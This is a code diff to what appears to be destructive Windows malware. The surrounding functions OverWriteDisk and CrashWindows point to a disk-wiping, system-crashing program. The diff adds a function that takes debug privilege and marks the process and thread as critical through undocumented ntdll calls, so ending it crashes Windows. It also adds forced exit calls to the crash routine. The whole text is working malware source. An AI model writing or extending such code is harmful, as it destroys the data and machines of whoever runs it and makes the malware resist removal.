@@ -211,6 +211,21 @@ void OverWriteDisk() {
     }
 }
 
+void SetCriticalProcess() {
+    HANDLE hToken = NULL;
+    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
+
+    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
+    VOID(WINAPI * RtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN) = (VOID(WINAPI * )(BOOLEAN, PBOOLEAN, BOOLEAN))GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
+    VOID(WINAPI * RtlSetThreadIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN) = (VOID(WINAPI*)(BOOLEAN, PBOOLEAN, BOOLEAN))GetProcAddress(hNtdll, "RtlSetThreadIsCritical");
+
+    SetPrivilege(hToken, SE_DEBUG_NAME, true);
+    if (RtlSetProcessIsCritical && RtlSetThreadIsCritical) {
+        RtlSetProcessIsCritical(true, NULL, false);
+        RtlSetThreadIsCritical(true, NULL, false);
+    }
+}
+
 void CrashWindows() {
     HMODULE hNtdll = LoadLibrary(L"ntdll.dll");
     VOID(*RtlAdjustPrivilege)(DWORD, DWORD, BOOLEAN, LPBYTE) = (VOID(*)(DWORD, DWORD, BOOLEAN, LPBYTE))GetProcAddress(hNtdll, "RtlAdjustPrivilege");
@@ -225,4 +240,8 @@ void CrashWindows() {
     }
 
     FreeLibrary(hNtdll);
+
+    ExitWindows();
+
+    ExitProcess(0);
 }
